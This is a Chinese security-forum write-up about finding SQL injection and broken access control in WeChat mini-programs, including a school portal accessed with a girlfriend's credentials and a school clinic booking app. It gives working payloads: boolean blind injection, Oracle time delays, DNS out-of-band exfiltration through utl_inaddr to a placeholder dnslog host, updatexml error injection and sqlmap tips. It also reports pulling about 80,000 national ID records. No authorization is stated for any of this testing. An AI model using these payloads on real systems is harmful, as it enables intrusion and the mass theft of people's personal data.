0x00 前言
=======

最近陪别人挖小程序，没有解包操作，就对单纯的数据包进行测试，发现SQL注入还是很多的，小程序开发对接口权限频和SQL繁出现问题，因此导致大量信息泄露。而且在大多数均在json接口中出现，下面是几个简单案例，希望对你有用，学会了后每天一个SQL应该不在话下，这几个案例都是一周之内发现的。

0x01 我爱我的女朋友
============

**本案例废话编辑：北纬以北**

**实操：浪飒**

闲来无事，想挖挖小程序漏洞，然后想到女朋友学校貌似还没动过嘿嘿，要来了账号密码先登录了他们学校的门户网站，一通乱搞，啥也没发现，不死心去小程序看了看，随记录本次测试流程。

这里直接打开小程序，配置好burp和proxifier抓包

![img](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-75fe21840f5829d1dfcb520a263d6709b36118c2.png) ![img](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-e0ae874d5975b5a0aa0f2eca0d141afa42003f56.png)

打开小程序自动抓取了两个数据包，这里一看，直接遍历api参数，看看能返回那些数据，遍历就不放图出来了，发现1-27都有数据，其中不乏包括姓名，身份证，学号，班级，校区，有住址，手机号等，其中身份证条数更是多达八万多条，随便放两张图。

![img](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-f9d07db7ba230e753755466a5b9146b775553ed9.png)![img](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-5140f9230e843da0f44d2842218f8df263e25083.png)

测试到这儿我以为结束了，准备关闭小程序交洞去了，手突然碰到一个单引号，突然点了个发送，巧了，返回包突然出现了报错。

![img](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-4c91a22501b1eb422d5a1f173f2603b83480bb56.png)

这里我进入了死胡同，一直拿着api参数注入，后面发现后面还有个参数order\_flow\_status，貌似是表示字段，这里果断换成身份证字段进行注入，后面发现存在waf，很多报错函数被拦截，于是使用盲注手法进行注入。

sql注入常用函数
---------

 1、system\_user()系统用户名  
 ​  
 2、user()用户名  
 ​  
 3、current\_user()当前用户名  
 ​  
 4、session\_user()链接数据库的用户名  
 ​  
 5、database()数据库名  
 ​  
 6、version()数据库版本  
 ​  
 7、@@datadir数据库路径  
 ​  
 8、@@basedir数据库安装路径  
 ​  
 9、@@version\_conpile\_os操作系统  
 ​  
 10、count()返回执行结果数量  
 ​  
 11、concat()没有分隔符的链接字符串  
 ​  
 12、concat\_ws()含有分隔符的连接字符串  
 ​  
 13、group\_concat()连接一个组的所有字符串，并以逗号分隔每一条数据  
 ​  
 14、load\_file()读取本地文件  
 ​  
 15、into outfile 写文件  
 ​  
 16、ascii()字符串的ASCII代码值  
 ​  
 17、ord()返回字符串第一个字符的ASCII值  
 ​  
 18、mid()返回一个字符串的一部分  
 ​  
 19、substr()返回一个字符串的一部分  
 ​  
 20、length()返回字符串的长度  
 ​  
 21、left()返回字符串最左面几个字符  
 ​  
 22、floor()返回小于或等于x的最大整数  
 ​  
 23、rand()返回0和1之间的一个随机数

**该系统有WAF，禁用的函数有**：select，ascii，substr，sleep，waitfor delay，mid，left，concat等等。

最终不断测试还好database和length没有禁用。

测试注入
----

当前执行的为exp(0)=1返回为true,因此查到数据，但因数据太大，则数据在burp不显示，而数据则为接口越权返回的数据相同。当前执行的为exp(0)=2返回为false,因此查到数据为空，证明存在布尔型盲注。

**下图SQL解释：**如果数据库名称长度为1，则返回1，否则exp(0)=1

![img](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-89a299f9d10276dafd5e9fd15c8dfac3ebd0eda0.png)![img](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-6f6f3363b8f5c9190f6f6e730a1958dcd8a097ff.png)

查数据库版本
------

通过测试发现数据库版本长度为10

![img](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-d34a8bd76e892486b9d747b534b5c4c4a0fac7fb.png)

利用ord()和right()函数爆破数据库版本，对照ASCII编码表很轻松就能得知数据库版本，这里随意放两张爆破图

- ord()：返回字符串第一个字符的ASCII值
- right()：返回字符串最右面几个字符

**下图SQL解释：**如果数据库版本从右往左数第十位的ASCII值为53为真，返回1(true)，否则返回exp(0)=2(false)。

![img](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-e8af0a3208e0ee78ecd50f86ed87d687ef3db5e4.png)![img](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-5ba272f34c83909a1561876ee177b5c79732ccde.png)

通过逐个遍历遍历，第九第八最终得出数据库版本

最终数据库版本为5.7.30-log

查数据库名称
------

再度查询到数据库长度为12，经过爆破后得到数据库名为xxx\_xxx\_xxxx,随意放两张截图

![img](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-3305f1307756a542046a1295f2c672492f31fa35.png)![img](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-c586e2b27ea47710a087a9283b259765e8f9248b.png)

0x02 就诊需谨慎
==========

某学校就诊挂号小程序点击进入，在userID处写27551 or 1=1 恒为真时，返回全部数据，包括身份证，电话，住址等等。

![image-20230614123842178](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-50610afaf28a6b452116420b90987627fe1ff4db.png)

尝试联合注入发现缺少from关键字，联想到在 oracle中使用查询语句必须跟一个表名，因此猜测是Oracle数据库

![image-20230614124421725](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-b01fcc89a9ae6b73d50f962134ca791b13453db0.png)

下面尝试两种形式证明漏洞

**延时注入**
--------

SQL语句：and DBMS\_PIPE.RECEIVE\_MESSAGE('ICQ',5)=1

延时10秒

![image-20230614124617443](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-959dc69ad5306a8387e65185b5c30096e5d285ce.png)

延时5秒

![image-20230614124731230](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-e1a837fd75057d5ff4d23bb09aa61d5643f9068d.png)

DNSlog注入
--------

由于延时注入太耗费时间，选择数据带外

![image-20230614130623660](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-658020a2a79370d3c64eafec74771ff20026199c.png)

SQL语句：查询用户名

 and (select utl\_inaddr.get\_host\_address((select user from dual)||'.dnslog地址') from dual)is not null --

![image-20230614130524387](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-9b76cc4205f0f9770b787b98e52b8c047bbedeb3.png)

SQL语句：查询库名

 and (select utl\_inaddr.get\_host\_address((select name from v$database)||'.dnslog地址') from dual)is not null --

![image-20230614131005879](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-d87e8b32982edfb073c5baf5ee799cc787fc8342.png)

![image-20230614131038272](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-9ebaf85da07863a7ae954f11fa8be94ed184d8cb.png)

0x03 两个常规注入
===========

报错注入
----

常规sql报错语句，无WAF：

 'and (updatexml(1,concat(0x7e,(select database()),0x7e),1)) -- q

![image-20230614135021781](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-a3b76dbe4040e9bcf5967329dd959406d7c21081.png)

可直接SQLmap
---------

> 小贴士：小程序sql注入直接粘贴burp中的包是跑不出来的，因为强制https的原因，我们需要在host后面加上443端口。

![image-20230614135223055](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-1f315dc87f05885dbe13fab81e92f4936d096a26.png)

![image-20230614135313327](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-00b1cf3168a849680a7d31572ff798667e70ee63.png)

0x04 总结
=======

上述sql注入均为小程序中出现的漏洞。

小程序中在不反编译代码的情况下，一般测试如下：

1. 点击所有功能，逐个分析每个数据包，极大概率存在敏感信息泄露和未授权的接口。
2. 对参数进行挨个测试，在用户名，id，分页功能处均可能存在SQL注入，且尽量使用手工，sqlmap说不定会让你错过很多注入的洞，有十足把握或者无WAF再尝试sqlmap。
3. 文件上传大多为静态目录，可能存在极少数会上传后端拿到shell。
4. 平行越权大概率有SQL注入。